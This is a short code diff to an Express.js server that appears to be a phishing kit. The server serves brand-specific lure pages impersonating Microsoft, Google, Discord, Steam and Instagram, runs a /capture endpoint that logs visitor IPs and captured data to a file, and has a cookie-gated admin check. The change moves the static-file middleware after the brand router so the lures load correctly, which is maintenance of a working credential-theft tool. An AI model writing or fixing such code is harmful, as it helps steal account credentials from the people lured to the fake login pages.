@@ -8,7 +8,6 @@ const app = express();
 
 app.use(express.json());
 app.use(cookieParser());
-app.use(express.static('public'));
 
 const LOG = path.join('/tmp', 'captures.log');
 const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(16).toString('hex');
@@ -63,7 +62,7 @@ function isAdmin(req) {
   return req.cookies && req.cookies.rack_session === SESSION_SECRET;
 }
 
-// hub / brand router
+// 1. brand router — MUST come before express.static
 app.get('/', (req, res) => {
   const brand = (req.query.b || '').toLowerCase();
   const valid = ['microsoft', 'google', 'discord', 'steam', 'instagram', 'generic'];
@@ -72,6 +71,9 @@ app.get('/', (req, res) => {
   }
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
+
+// 2. static files (css, js, direct .html access)
+app.use(express.static('public'));
 
 app.post('/capture', (req, res) => {
   const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
